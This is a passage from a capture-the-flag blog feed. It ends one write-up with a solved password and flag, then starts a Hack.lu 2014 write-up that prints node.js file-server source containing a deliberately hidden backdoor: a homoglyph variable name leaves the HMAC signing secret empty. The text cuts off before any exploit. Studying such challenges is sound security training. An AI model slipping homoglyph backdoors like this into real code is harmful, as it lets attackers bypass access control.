<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>joes_gold@goldstash:~$ ./gold_stash
</span><span class='line'>          (_/-------------_______________________)
</span><span class='line'>          `|  /~~~~~~~~~~\                       |
</span><span class='line'>           ;  |--------(-||______________________|
</span><span class='line'>           ;  |--------(-| ____________|
</span><span class='line'>           ;  \__________/&#39;
</span><span class='line'>         _/__         ___;
</span><span class='line'>      ,~~    |  __--~~       Gunslinger Joe&#39;s
</span><span class='line'>     &#39;        ~~| (  |       Private Stash of Gold
</span><span class='line'>    &#39;      &#39;~~  `____&#39;
</span><span class='line'>   &#39;      &#39;
</span><span class='line'>  &#39;      `            Password Protection activated!
</span><span class='line'> &#39;       `
</span><span class='line'>&#39;--------`
</span><span class='line'>Username: Joe
</span><span class='line'>Password: bcXoc]VkTGrE_oKcXT
</span><span class='line'>Access granted!
</span><span class='line'>$ cat FLAG
</span><span class='line'>flag{joe_thought_youd_never_find_that_module}
</span><span class='line'>$
</span></code></pre></td></tr></table></div></figure>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Hack.lu 2014 - Hidden in ρlaιn sιght]]></title>
    <link href="http://www.captchaflag.com/blog/2014/10/23/hack-dot-lu-2014-hidden-in-plain-sight/"/>
    <updated>2014-10-23T13:23:00-04:00</updated>
    <id>http://www.captchaflag.com/blog/2014/10/23/hack-dot-lu-2014-hidden-in-plain-sight</id>
    <content type="html"><![CDATA[<h2>Challenge</h2>

<p>At our software development company, one of the top developers left in anger. He told us that he had hidden a backdoor in our node.js server application – he thinks that we can&#8217;t find it even if we try. I have attached the source code of our fileserver. After registration, you can log in, upload files and create access tokens for your files that others can use to retrieve them. He must have added some way to retrieve files without permission. And we don&#8217;t have version control, so we can&#8217;t just check his last commits. We have read the source code multiple times, but just can&#8217;t figure out how he did it. Maybe he just lied? Can you help us and demonstrate how the backdoor works? We have uploaded a file to &quot;testuser/files/flag.txt&quot; – please try to retrieve it. </p>

<p>Connect to https://wildwildweb.fluxfingers.net:1409/. Note that all your files will be purged every 5 minutes. </p>

<p>You can download the service code here: <a href="https://wildwildweb.fluxfingers.net/static/chals/hiddeninplainsight_7a1f79aab159ace6e4486dc73bd24cc8.js">Download</a></p>

<h2>Analysis</h2>

<p>Downloading the code gives us:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
</pre></td><td class='code'><pre><code class='js'><span class='line'><span class="err">#</span><span class="o">!</span><span class="err">/usr/bin/env node</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// npm install express@3.18.0</span>
</span><span class='line'>
</span><span class='line'><span class="kd">var</span> <span class="nx">fs</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;fs&#39;</span><span class="p">)</span>
</span><span class='line'><span class="kd">var</span> <span class="nx">crypto</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;crypto&#39;</span><span class="p">)</span>
</span><span class='line'><span class="kd">var</span> <span class="nx">express</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;express&#39;</span><span class="p">)</span>
</span><span class='line'><span class="kd">var</span> <span class="nx">app</span> <span class="o">=</span> <span class="nx">express</span><span class="p">()</span>
</span><span class='line'><span class="nx">app</span><span class="p">.</span><span class="nx">listen</span><span class="p">(</span><span class="mi">1409</span><span class="p">)</span>
</span><span class='line'><span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;express&#39;</span><span class="p">).</span><span class="nx">bodyParser</span><span class="p">({</span><span class="nx">uploadDir</span><span class="o">:</span> <span class="nx">__dirname</span><span class="o">+</span><span class="s1">&#39;/upload_tmp/&#39;</span><span class="p">}))</span>
</span><span class='line'>
</span><span class='line'><span class="kd">var</span> <span class="nx">HMAC_SECRET</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span><span class='line'><span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nx">i</span><span class="o">&lt;</span><span class="mi">20</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>  <span class="nx">HMAC_S</span><span class="err">Ε</span><span class="nx">CRET</span> <span class="o">=</span> <span class="nx">HMAC_SECRET</span> <span class="o">+</span> <span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">()</span><span class="o">+</span><span class="s1">&#39;&#39;</span><span class="p">).</span><span class="nx">substr</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kd">function</span> <span class="nx">hmac_sign</span><span class="p">(</span><span class="nx">path</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>  <span class="kd">var</span> <span class="nx">hmac</span> <span class="o">=</span> <span class="nx">crypto</span><span class="p">.</span><span class="nx">createHmac</span><span class="p">(</span><span class="s1">&#39;sha256&#39;</span><span class="p">,</span> <span class="nx">HMAC_SECRET</span><span class="p">)</span>
</span><span class='line'>  <span class="nx">hmac</span><span class="p">.</span><span class="nx">update</span><span class="p">(</span><span class="nx">path</span><span class="p">)</span>
</span><span class='line'>  <span class="k">return</span> <span class="nx">hmac</span><span class="p">.</span><span class="nx">digest</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">)</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>  <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s1">&#39;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;docstore&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;ul&gt;&#39;</span>
</span><span class='line'>          <span class="o">+</span>  <span class="s1">&#39;&lt;li&gt;&lt;a href=&quot;register&quot;&gt;register&lt;/a&gt;&lt;/li&gt;&#39;</span>
</span><span class='line'>          <span class="o">+</span>  <span class="s1">&#39;&lt;li&gt;&lt;a href=&quot;upload&quot;&gt;upload a file&lt;/a&gt;&lt;/li&gt;&#39;</span>
</span><span class='line'>          <span class="o">+</span>  <span class="s1">&#39;&lt;li&gt;&lt;a href=&quot;link&quot;&gt;generate an access link&lt;/a&gt;&lt;/li&gt;&#39;</span>
</span><span class='line'>          <span class="o">+</span><span class="s1">&#39;&lt;/ul&gt;&lt;/body&gt;&lt;/html&gt;&#39;</span><span class="p">)</span>
</span><span class='line'><span class="p">})</span>
</span><span class='line'>
</span><span class='line'><span class="kd">function</span> <span class="nx">user_possible</span><span class="p">(</span><span class="nx">user</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>  <span class="k">return</span> <span class="sr">/^[a-zA-Z]+$/</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">user</span><span class="p">)</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kd">function</span> <span class="nx">auth_ok</span><span class="p">(</span><span class="nx">user</span><span class="p">,</span> <span class="nx">pass</span><span class="p">,</span> <span class="nx">cb</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">user_possible</span><span class="p">(</span><span class="nx">user</span><span class="p">))</span> <span class="k">return</span> <span class="nx">cb</span><span class="p">(</span><span class="kc">false</span><span class="p">)</span>
</span><span class='line'>  <span class="nx">fs</span><span class="p">.</span><span class="nx">readFile</span><span class="p">(</span><span class="s1">&#39;users/&#39;</span><span class="o">+</span><span class="nx">user</span><span class="o">+</span><span class="s1">&#39;/pass&#39;</span><span class="p">,</span> <span class="p">{</span><span class="nx">encoding</span><span class="o">:</span><span class="s1">&#39;utf8&#39;</span><span class="p">},</span> <span class="kd">function</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="nx">real_pass</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="k">return</span> <span class="nx">cb</span><span class="p">(</span><span class="kc">false</span><span class="p">)</span> <span class="c1">// e.g. if user doesn&#39;t exist</span>
</span><span class='line'>    <span class="nx">cb</span><span class="p">(</span><span class="nx">pass</span> <span class="o">===</span> <span class="nx">real_pass</span><span class="p">)</span>
</span><span class='line'>  <span class="p">})</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/register&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>  <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s1">&#39;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;register&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form method=&quot;POST&quot;&gt;&#39;</span><span class="o">+</span>
</span><span class='line'>    <span class="s1">&#39;user: &lt;input type=&quot;text&quot; name=&quot;user&quot;&gt;&lt;br&gt;pass: &lt;input type=&quot;password&quot; name=&quot;pass&quot;&gt;&lt;br&gt;&lt;button type=&quot;submit&quot;&gt;register&lt;/button&gt;&#39;</span><span class="o">+</span>
</span><span class='line'>    <span class="s1">&#39;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;&#39;</span><span class="p">)</span>
</span><span class='line'><span class="p">})</span>
</span><span class='line'>
</span><span class='line'><span class="nx">app</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s1">&#39;/register&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">)</span> <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s1">&#39;body missing? wtf?&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="kd">var</span> <span class="nx">user</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">user</span><span class="p">,</span> <span class="nx">pass</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">pass</span><span class="p">;</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span> <span class="nx">user</span> <span class="o">!==</span> <span class="s1">&#39;string&#39;</span> <span class="o">||</span> <span class="k">typeof</span> <span class="nx">pass</span> <span class="o">!==</span> <span class="s1">&#39;string&#39;</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s1">&#39;bad request&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">user_possible</span><span class="p">(</span><span class="nx">user</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s1">&#39;bad username&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="kd">var</span> <span class="nx">userdir</span> <span class="o">=</span> <span class="s1">&#39;users/&#39;</span><span class="o">+</span><span class="nx">user</span><span class="o">+</span><span class="s1">&#39;/&#39;</span>
</span><span class='line'>  <span class="nx">fs</span><span class="p">.</span><span class="nx">mkdir</span><span class="p">(</span><span class="nx">userdir</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s1">&#39;unable to create user: &#39;</span><span class="o">+</span><span class="nx">e</span><span class="p">.</span><span class="nx">code</span><span class="p">)</span>
</span><span class='line'>    <span class="nx">fs</span><span class="p">.</span><span class="nx">writeFile</span><span class="p">(</span><span class="nx">userdir</span><span class="o">+</span><span class="s1">&#39;pass&#39;</span><span class="p">,</span> <span class="nx">pass</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="k">if</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="k">throw</span> <span class="nx">err</span>
</span><span class='line'>      <span class="nx">fs</span><span class="p">.</span><span class="nx">mkdir</span><span class="p">(</span><span class="nx">userdir</span><span class="o">+</span><span class="s1">&#39;files&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">if</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="k">throw</span> <span class="nx">err</span>
</span><span class='line'>        <span class="nx">res</span><span class="p">.</span><span class="nx">redirect</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
</span><span class='line'>      <span class="p">})</span>
</span><span class='line'>    <span class="p">})</span>
</span><span class='line'>  <span class="p">})</span>
</span><span class='line'><span class="p">})</span>
</span><span class='line'>
</span><span class='line'><span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/upload&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>  <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s1">&#39;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;upload&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;&#39;</span><span class="o">+</span>
</span><span class='line'>    <span class="s1">&#39;user: &lt;input type=&quot;text&quot; name=&quot;user&quot;&gt;&lt;br&gt;pass: &lt;input type=&quot;password&quot; name=&quot;pass&quot;&gt;&lt;br&gt;&lt;input type=&quot;file&quot; name=&quot;file&quot;&gt;&lt;br&gt;&lt;button type=&quot;submit&quot;&gt;upload&lt;/button&gt;&#39;</span><span class="o">+</span>
</span><span class='line'>    <span class="s1">&#39;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;&#39;</span><span class="p">)</span>
</span><span class='line'><span class="p">})</span>
</span><span class='line'>
</span><span class='line'><span class="kd">function</span> <span class="nx">sanitize_filename</span><span class="p">(</span><span class="nx">f</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>  <span class="nx">f</span> <span class="o">=</span> <span class="nx">f</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/[^a-zA-Z0-9_.-]/g</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="nx">f</span><span class="p">.</span><span class="nx">length</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">||</span> <span class="nx">f</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;.&#39;</span><span class="p">)</span> <span class="nx">f</span> <span class="o">=</span> <span class="s1">&#39;_&#39;</span><span class="o">+</span><span class="nx">f</span>
</span><span class='line'>  <span class="k">return</span> <span class="nx">f</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="nx">app</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s1">&#39;/upload&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">)</span> <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s1">&#39;body missing? wtf?&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="kd">var</span> <span class="nx">user</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">user</span><span class="p">,</span> <span class="nx">pass</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">pass</span><span class="p">,</span> <span class="nx">file</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">files</span><span class="p">.</span><span class="nx">file</span><span class="p">;</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span> <span class="nx">user</span> <span class="o">!==</span> <span class="s1">&#39;string&#39;</span> <span class="o">||</span> <span class="k">typeof</span> <span class="nx">pass</span> <span class="o">!==</span> <span class="s1">&#39;string&#39;</span> <span class="o">||</span> <span class="k">typeof</span> <span class="nx">file</span> <span class="o">!==</span> <span class="s1">&#39;object&#39;</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s1">&#39;bad request&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="nx">auth_ok</span><span class="p">(</span><span class="nx">user</span><span class="p">,</span> <span class="nx">pass</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">is_ok</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">is_ok</span><span class="p">)</span> <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s1">&#39;bad auth&#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="kd">var</span> <span class="nx">filename</span> <span class="o">=</span> <span class="nx">sanitize_filename</span><span class="p">(</span><span class="nx">file</span><span class="p">.</span><span class="nx">name</span><span class="p">)</span>
</span><span class='line'>    <span class="nx">fs</span><span class="p">.</span><span class="nx">rename</span><span class="p">(</span><span class="nx">file</span><span class="p">.</span><span class="nx">path</span><span class="p">,</span> <span class="s1">&#39;users/&#39;</span><span class="o">+</span><span class="nx">user</span><span class="o">+</span><span class="s1">&#39;/files/&#39;</span><span class="o">+</span><span class="nx">filename</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="k">if</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s1">&#39;error: unable to rename&#39;</span><span class="p">)</span>
</span><span class='line'>      <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s1">&#39;file was stored with name &#39;</span><span class="o">+</span><span class="nx">filename</span><span class="p">)</span>
</span><span class='line'>    <span class="p">})</span>
</span><span class='line'>  <span class="p">})</span>
</span><span class='line'><span class="p">})</span>
</span><span class='line'>
</span><span class='line'><span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/link&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>  <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s1">&#39;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;generate a link&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;&#39;</span><span class="o">+</span>
</span><span class='line'>    <span class="s1">&#39;user: &lt;input type=&quot;text&quot; name=&quot;user&quot;&gt;&lt;br&gt;pass: &lt;input type=&quot;password&quot; name=&quot;pass&quot;&gt;&lt;br&gt;file: &lt;input type=&quot;text&quot; name=&quot;file&quot;&gt;&lt;br&gt;&lt;button type=&quot;submit&quot;&gt;generate link&lt;/button&gt;&#39;</span><span class="o">+</span>
</span><span class='line'>    <span class="s1">&#39;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;&#39;</span><span class="p">)</span>
</span><span class='line'><span class="p">})</span>
</span><span class='line'>
</span><span class='line'><span class="nx">app</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s1">&#39;/link&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">)</span> <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s1">&#39;body missing? wtf?&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="kd">var</span> <span class="nx">user</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">user</span><span class="p">,</span> <span class="nx">pass</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">pass</span><span class="p">,</span> <span class="nx">file</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">file</span><span class="p">;</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span> <span class="nx">user</span> <span class="o">!==</span> <span class="s1">&#39;string&#39;</span> <span class="o">||</span> <span class="k">typeof</span> <span class="nx">pass</span> <span class="o">!==</span> <span class="s1">&#39;string&#39;</span> <span class="o">||</span> <span class="k">typeof</span> <span class="nx">file</span> <span class="o">!==</span> <span class="s1">&#39;string&#39;</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s1">&#39;bad request&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="nx">file</span> <span class="o">=</span> <span class="nx">sanitize_filename</span><span class="p">(</span><span class="nx">file</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="nx">auth_ok</span><span class="p">(</span><span class="nx">user</span><span class="p">,</span> <span class="nx">pass</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">is_ok</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">is_ok</span><span class="p">)</span> <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s1">&#39;bad auth&#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="nx">file</span> <span class="o">=</span> <span class="nx">file</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/[^a-zA-Z0-9_.-]/g</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="nx">res</span><span class="p">.</span><span class="nx">redirect</span><span class="p">(</span><span class="s1">&#39;/files/&#39;</span><span class="o">+</span><span class="nx">user</span><span class="o">+</span><span class="s1">&#39;/&#39;</span><span class="o">+</span><span class="nx">file</span><span class="o">+</span><span class="s1">&#39;/&#39;</span><span class="o">+</span><span class="nx">hmac_sign</span><span class="p">(</span><span class="nx">user</span><span class="o">+</span><span class="s1">&#39;/&#39;</span><span class="o">+</span><span class="nx">file</span><span class="p">))</span>
</span><span class='line'>  <span class="p">})</span>
</span><span class='line'><span class="p">})</span>
</span><span class='line'>
</span><span class='line'><span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s1">&#39;/files/:user/:file/:signature&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>  <span class="kd">var</span> <span class="nx">user</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">params</span><span class="p">.</span><span class="nx">user</span><span class="p">,</span> <span class="nx">file</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">params</span><span class="p">.</span><span class="nx">file</span><span class="p">,</span> <span class="nx">signature</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">params</span><span class="p">.</span><span class="nx">signature</span>
